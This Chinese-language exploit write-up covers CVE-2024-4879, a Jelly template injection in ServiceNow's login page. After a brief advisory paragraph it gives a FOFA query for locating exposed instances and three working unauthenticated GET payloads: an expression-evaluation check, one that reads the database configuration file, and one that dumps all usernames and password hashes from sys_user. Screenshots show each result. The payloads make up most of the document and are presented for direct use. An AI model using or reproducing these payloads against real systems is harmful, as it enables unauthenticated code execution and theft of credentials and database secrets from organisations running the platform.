## ServiceNow-UI存在Jelly模板注入漏洞(CVE-2024-4879)

ServiceNow已经解决了在多伦多和华盛顿特区发布的Now Platform版本中输入验证漏洞的问题。这一漏洞可能使未经身份验证的用户能够在Now Platform的上下文中远程执行代码。侧通道ServiceNow对托管实例应用了更新，并向合作伙伴和自助客户发布了更新。以下是解决漏洞的补丁程序和快速修复方案。如果您尚未这样做，我们建议您尽快应用与您实例相关的安全补丁。

## fofa

```yaml
app="servicenow-Products"
```

## poc

```shell
GET /login.do?jvar_page_title=<style><j:jelly xmlns:j="jelly" xmlns:g='glide'><g:evaluate>gs.addErrorMessage(7*7);</g:evaluate></j:jelly></style> HTTP/1.1
Host: 
```

![image-20240712235518735](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407122359842.png)

### 读取数据库配置文件

```shell
GET /login.do?jvar_page_title=<style><j:jelly xmlns:j="jelly:core" xmlns:g='glide'><g:evaluate>z=new Packages.java.io.File("").getAbsolutePath();z=z.substring(0,z.lastIndexOf("/"));u=new SecurelyAccess(z.concat("/co..nf/glide.db.properties")).getBufferedReader();s="";while((q=u.readLine())!==null)s=s.concat(q,"\n");gs.addErrorMessage(s);</g:evaluate></j:jelly></style> HTTP/1.1
Host: 
```

![image-20240712235342615](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407130000368.png)

![image-20240712235455652](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407130000443.png)

### 读取密码

```shell
/login.do?jvar_page_title=<style><j:jelly xmlns:j="jelly" xmlns:g='glide'><g:evaluate>gr=new GlideRecord("sys_user");gr.query();s="";while(gr.next())s=s.concat(gr.user_name," : ",gr.user_password,"<br/>");gs.addErrorMessage(s);</g:evaluate></j:jelly></style>
```

![image-20240713000223133](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407130002183.png)

## 漏洞来源

- https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data